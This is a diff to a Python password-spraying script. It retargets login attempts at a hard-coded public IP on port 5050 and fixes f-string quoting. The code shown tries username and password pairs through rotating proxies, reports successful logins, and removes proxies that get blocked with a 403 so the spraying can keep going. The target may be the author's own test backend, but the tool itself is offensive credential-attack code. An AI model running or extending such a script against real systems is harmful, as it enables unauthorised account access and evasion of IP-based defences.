@@ -11,9 +11,14 @@ load_dotenv()
 # print_lock = threading.Lock()
 print("Starting...")
 
+IP = "54.234.124.97"
+PORT = "5050"
+
 # Set the correct target URL for the login endpoint on your backend
 # url = "http://localhost:5050/login"
-url = 'http://50.19.17.226:5050/login'
+url = f"http://{IP}:{PORT}/login"
+
+print("Target address: ", url)
 
 # Define Header
 headers = {
@@ -142,24 +147,24 @@ def rotating_proxy(username, password):
 
             # Handle response codes
             if login_response.status_code == 200:
-                print(f"[+] Successful login with {username}:{password} using proxy {proxies["http"]}")
+                print(f"[+] Successful login with {username}:{password} using proxy {proxies['http']}")
                 return  # Exit on successful login
             elif login_response.status_code == 401:
-                print(f"[-] Failed login for {username}:{password} (401 Unauthorized) using proxy {proxies["http"]}")
+                print(f"[-] Failed login for {username}:{password} (401 Unauthorized) using proxy {proxies['http']}")
                 break  # No need to retry on a 401 error
             elif login_response.status_code == 403:
-                print(f"[-] Proxy blocked (403 Forbidden) for {username}:{password} using proxy {proxies["http"]}")
+                print(f"[-] Proxy blocked (403 Forbidden) for {username}:{password} using proxy {proxies['http']}")
                 # Remove the blocked proxy
                 with proxies_lock:
                     # proxies_list.remove(proxies)
                     delete_proxy_in_constant_time(proxies["http"])
                 retry_count += 1  # Increment retry count after a 403
             else:
-                print(f"[-] Other failure for {username}:{password} (Status Code: {login_response.status_code}) using proxy {proxies["http"]}")
+                print(f"[-] Other failure for {username}:{password} (Status Code: {login_response.status_code}) using proxy {proxies['http']}")
                 retry_count += 1
 
         except requests.RequestException as e:
-            print(f"[-] Error with proxy {proxies["http"]} - Username: {username} and Password:{password} - {e}")
+            print(f"[-] Error with proxy {proxies['http']} - Username: {username} and Password:{password} - {e}")
             retry_count += 1  # Increment retry count on request error
         except Exception as e:
             # Handle any other exceptions that may occur
@@ -216,5 +221,3 @@ if __name__ == "__main__":
     password_spray(usernames, passwords)
     time.sleep(2)
     print(len(proxies_list))
-
-    
